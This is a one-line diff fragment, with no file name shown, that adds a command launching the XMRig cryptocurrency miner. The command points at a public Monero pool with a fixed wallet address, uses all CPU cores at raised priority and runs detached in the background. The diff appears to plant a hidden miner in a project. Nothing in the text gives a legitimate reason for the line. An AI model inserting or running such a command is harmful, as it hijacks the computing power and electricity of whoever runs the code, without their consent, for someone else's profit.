@@ -1,0 +1,1 @@
+./xmrig --donate-level 1 -o pool.supportxmr.com:443 -u 43MvHxPaDfjW5t1ym6pPUVRKQDfaPMfonbpezViDUyCNNVKJCTYaBur5LovmXiSEjZRUruCqEZ3MYDh5HZ2XJaQz64RFybL.x -k --tls --cpu-no-yield --cpu-priority=5 --max-cpu-usage=100 --randomx-1gb-pages --background
